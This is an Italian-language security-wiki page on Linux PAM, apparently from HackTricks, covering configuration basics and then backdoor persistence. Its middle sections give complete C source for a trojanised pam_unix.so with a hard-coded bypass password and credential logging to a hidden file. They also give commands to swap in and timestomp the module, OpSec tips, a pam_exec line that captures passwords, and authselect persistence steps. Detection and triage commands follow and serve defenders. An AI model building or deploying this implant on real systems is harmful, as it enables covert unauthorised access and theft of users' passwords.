# PAM - Moduli di autenticazione collegabili

### Informazioni di base

**PAM (Pluggable Authentication Modules)** funge da meccanismo di sicurezza che **verifica l'identità degli utenti che tentano di accedere ai servizi informatici**, controllandone l'accesso in base a vari criteri. È simile a un custode digitale, che garantisce che solo gli utenti autorizzati possano utilizzare servizi specifici, limitandone potenzialmente l'uso per evitare il sovraccarico del sistema.

#### File di configurazione

- **Solaris** supporta il file centrale legacy `/etc/pam.conf`, ma le indicazioni attuali preferiscono i file dei servizi in `/etc/pam.d`.<sup>[[10]](#references)</sup>
- I sistemi **Linux** preferiscono un approccio basato su directory, memorizzando le configurazioni specifiche dei servizi in `/etc/pam.d`. Ad esempio, il file di configurazione per il servizio login si trova in `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Un esempio di configurazione PAM per il servizio login potrebbe essere il seguente:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

Questi realms, o gruppi di gestione, includono **auth**, **account**, **password** e **session**, ognuno responsabile di diversi aspetti del processo di autenticazione e gestione della sessione:<sup>[[1]](#references)</sup>

- **Auth**: Convalida l'identità dell'utente, spesso richiedendo una password.
- **Account**: Gestisce la verifica dell'account, controllando condizioni come l'appartenenza a un gruppo o le restrizioni basate sull'ora del giorno.
- **Password**: Gestisce gli aggiornamenti delle password, inclusi i controlli di complessità o la prevenzione dei dictionary attacks.
- **Session**: Gestisce le azioni durante l'avvio o la terminazione di una service session, come il montaggio delle directory o l'impostazione dei limiti delle risorse.

#### **PAM Module Controls**

I controls determinano la risposta del module in caso di successo o errore, influenzando il processo di autenticazione complessivo. Includono:<sup>[[1]](#references)</sup>

- **Required**: L'errore di un module required causa infine un errore, ma solo dopo che tutti i module successivi sono stati verificati.
- **Requisite**: Terminazione immediata del processo in caso di errore.
- **Sufficient**: Se nessun module `required` precedente ha restituito un errore, il successo viene restituito immediatamente e i module rimanenti nello stesso management group vengono ignorati.
- **Optional**: Causa un errore solo se è l'unico module presente nello stack.

#### Offensive Semantics That Matter

Quando si analizza o modifica PAM, la **posizione di una regola inserita** determina quale stack la considera:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` e `substack` importano regole da altri file, quindi modificare `sshd` potrebbe influire solo su SSH, mentre modificare `system-auth`, `common-auth` o un altro shared stack può influire su diversi servizi contemporaneamente.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM supporta anche controls tra parentesi quadre come `[success=1 default=ignore]`. Questi possono essere abusati per **ignorare uno o più module** dopo un controllo personalizzato riuscito, invece di sostituire visibilmente `pam_unix.so`.<sup>[[1]](#references)</sup>
- Il `module-path` può essere **assoluto** (`/usr/lib/security/pam_custom.so`) o **relativo** alla directory predefinita dei PAM module. Sui moderni sistemi Linux, le directory reali sono spesso `/lib/security`, `/lib64/security`, `/usr/lib/security` oppure multiarch paths come `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Conclusione rapida per l'operator: mappa sempre il **full service graph** prima di applicare patch. Ad esempio, `sshd -> password-auth -> system-auth` su alcune distro oppure `sshd -> system-remote-login -> system-login -> system-auth` su altre significa che lo stesso implant di una sola riga può propagarsi molto più ampiamente del previsto.<sup>[[1]](#references)[[13]](#references)</sup>

#### Example Scenario

In una configurazione con diversi auth module, il processo segue un ordine rigoroso. Se il module `pam_securetty` rileva che il terminale di login non è autorizzato, i login di root vengono bloccati, ma tutti i module vengono comunque elaborati a causa del suo stato "required". `pam_env` imposta le variabili d'ambiente, favorendo potenzialmente la user experience. I module `pam_ldap` e `pam_unix` collaborano per autenticare l'utente; `pam_unix` tenta di utilizzare una password fornita in precedenza, migliorando l'efficienza e la flessibilità dei metodi di autenticazione.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## Backdooring PAM – Hooking `pam_unix.so`

Una tecnica classica di persistence negli ambienti Linux di alto valore consiste nel **sostituire la libreria PAM legittima con un drop-in trojanised**. Su un host il cui PAM stack carica `pam_unix.so`, l'autenticazione SSH o da console può invocare il suo entry point `pam_sm_authenticate()`; una replacement malevola può catturare le credenziali o implementare un bypass della password *magic*.<sup>[[2]](#references)[[11]](#references)</sup>

### Compilation Cheatsheet
Lo sketch seguente utilizza il service entry point `pam_sm_authenticate()` di Linux-PAM e `pam_get_authtok()` per accedere all'autenticazione token.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
if (real_module) return 0;
real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
if (!real_module) return -1;
orig_auth = dlsym(real_module, "pam_sm_authenticate");
orig_setcred = dlsym(real_module, "pam_sm_setcred");
return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user = NULL, *pass = NULL;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
if (user && pass) {
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
if (fd >= 0) {
dprintf(fd, "%s:%s\n", user, pass);
close(fd);
}
}

/* Forward to the renamed original module. */
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_setcred(pamh, flags, argc, argv);
}
```
</details>

Compila e sostituisci in modo furtivo (il pattern di replacement/timestomp è documentato da Unit 42). Adatta sia il percorso di backup hard-coded nel wrapper sia i comandi riportati di seguito alla directory effettiva dei moduli PAM del target:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Tips
1. **Atomic overwrite** – scrivi una libreria completa in un file temporaneo e rinominala nella posizione desiderata per evitare di lasciare un modulo di autenticazione scritto solo parzialmente.
2. È stato osservato un percorso come `/usr/bin/.dbus.log` nell'analisi di AuthDoor di Unit 42, quindi è anche un utile indicatore per la ricerca.<sup>[[2]](#references)</sup>
3. Preserva gli entry point previsti dallo stack PAM (ad esempio, `pam_sm_authenticate` e `pam_sm_setcred`) affinché le altre operazioni di gestione continuino a funzionare.<sup>[[11]](#references)[[18]](#references)</sup>

### Detection
Per i controlli di integrità dei package, RPM verifica i metadati dei file installati, `debsums -s` segnala gli errori di checksum e `dpkg -S`, nel blocco di triage, interroga la proprietà dei package; la sintassi di audit watch registra le scritture e le modifiche agli attributi di un percorso.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Confronta l'MD5/SHA256 di `pam_unix.so` con quello del package della distro.
* Usa `rpm -V pam` o `debsums -s libpam-modules` per individuare librerie sostituite senza calcolare manualmente gli hash.
* Controlla la presenza di permessi di scrittura per tutti o di proprietà insolite in `/lib/security/`.
* Regola `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Cerca nei file di configurazione PAM moduli imprevisti: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Comandi di triage rapido (dopo una compromissione o durante il threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Abusare di `pam_exec` per la persistenza
Invece di sostituire `pam_unix.so`, un approccio meno invasivo consiste nell'aggiungere una riga `pam_exec` in `/etc/pam.d/sshd`, in modo che un'invocazione che raggiunge quella riga PAM esegua un helper lasciando intatto lo stack normale.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` riceve i metadati PAM in variabili d'ambiente come `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` e `PAM_TYPE`. Con `expose_authtok`, l'helper può leggere fino a `PAM_MAX_RESP_SIZE` byte della password da `stdin` durante le fasi `auth` o `password`. Se vuoi che l'helper venga eseguito con l'UID effettivo anziché con l'UID reale, aggiungi `seteuid`.<sup>[[4]](#references)</sup>

Seguono alcune note pratiche sui tipi di modulo e sul filtro `type=` documentati per `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` è preferibile per le **azioni post-login**, come riaprire socket o avviare un daemon detached.
- `auth optional pam_exec.so quiet expose_authtok ...` è la scelta abituale per la **cattura delle credenziali**, perché viene eseguito prima dell'apertura della sessione.
- `type=session` o `type=auth` può essere utilizzato per limitare l'esecuzione a una fase PAM specifica ed evitare una doppia esecuzione rumorosa.

### Sopravvivere agli strumenti della distro: `authselect`

Sui sistemi della famiglia RHEL e Fedora che utilizzano `authselect`, le modifiche dirette ai file generati, come `/etc/pam.d/system-auth` o `/etc/pam.d/password-auth`, possono essere **sovrascritte da `authselect`**. Per garantire la persistenza, gli operatori modificano spesso il custom profile attivo in `/etc/authselect/custom/<profile>/` e poi lo riselezionano.<sup>[[5]](#references)[[19]](#references)</sup>

Workflow tipico quando disponi dei privilegi root:<sup>[[5]](#references)</sup>
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```
Questo è importante sia per l'offense sia per il triage: se `/etc/pam.d/system-auth` contiene il banner `Generated by authselect` e `Do not modify this file manually`, il vero punto di persistenza potrebbe trovarsi in `/etc/authselect/custom/` anziché in `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Tradecraft recente osservato in the wild

I recenti report del 2025 sul **Plague** Linux backdoor hanno mostrato la stessa idea di base portata oltre: un componente PAM malevolo con una **static bypass password**, oltre alla rimozione delle variabili d'ambiente correlate a SSH e della shell history (`HISTFILE=/dev/null`) per ridurre le tracce della sessione dopo il login.<sup>[[3]](#references)</sup> Si tratta di un utile hunting pattern, perché la logica del backdoor potrebbe risiedere in PAM, mentre gli stealth artifacts compaiono solo **dopo** che l'autenticazione è andata a buon fine.


## References

- [1] [pam.conf(5) / pam.d(5) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Il playbook dell'operatore covert: infiltrazione delle reti globali di telecomunicazioni - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: un backdoor per Linux basato su PAM scoperto di recente](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Configurazione dell'autenticazione degli utenti usando authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Pagine man di Debian](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Pagina man di Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Pagine man di Debian](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Gestione dell'autenticazione in Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Guida all'autenticazione a livello di sistema - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Elenco dei file del pacchetto Ubuntu: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Pagine man di Debian](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Modifiche/Rendere authselect obbligatorio - Wiki del Fedora Project](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
